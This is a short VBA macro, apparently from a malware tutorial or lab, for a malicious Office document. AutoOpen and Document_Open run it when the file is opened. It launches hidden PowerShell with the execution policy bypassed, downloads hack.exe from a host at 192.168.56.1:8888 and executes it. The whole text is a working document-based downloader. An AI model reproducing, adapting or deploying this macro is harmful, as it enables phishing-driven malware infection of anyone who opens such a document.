Sub MeowMacro()
    ' PowerShell ignore Execution policy
    Dim psScript As String
    psScript = "powershell.exe -ExecutionPolicy Bypass -window-style hidden (New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:8888/hack.exe', 'C:\temp\hack.exe'); Start-Process C:\temp\hack.exe"

    ' using WScript.Shell for run PowerShell
    Dim shell_object As Object
    Set shell_object = CreateObject("WScript.Shell")
    shell_object.Run psScript, 0, False ' 0 - hidden mode, False - no wait

    MsgBox "powershell script executed successfully."
End Sub

Sub AutoOpen()
    MeowMacro
End Sub

Sub Document_Open()
    MeowMacro
End Sub
